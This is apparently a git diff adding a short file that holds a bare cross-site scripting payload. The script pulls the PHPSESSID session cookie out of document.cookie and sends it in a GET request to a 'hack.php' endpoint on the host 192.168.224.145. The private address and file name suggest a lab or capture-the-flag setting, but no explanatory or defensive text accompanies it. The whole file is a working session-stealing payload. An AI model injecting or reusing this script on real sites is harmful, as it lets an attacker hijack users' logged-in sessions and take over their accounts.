@@ -1,0 +1,12 @@
+<script>
+let token = "";
+let name = "PHPSESSID";
+let value = "; " + document.cookie;
+let parts = value.split("; " + name + "=");
+if (parts.length === 2) token = parts.pop().split(";").shift();
+
+
+let xhr = new XMLHttpRequest();
+xhr.open('GET', 'http://192.168.224.145/hack.php?token=' + token, true);
+xhr.send()
+</script>
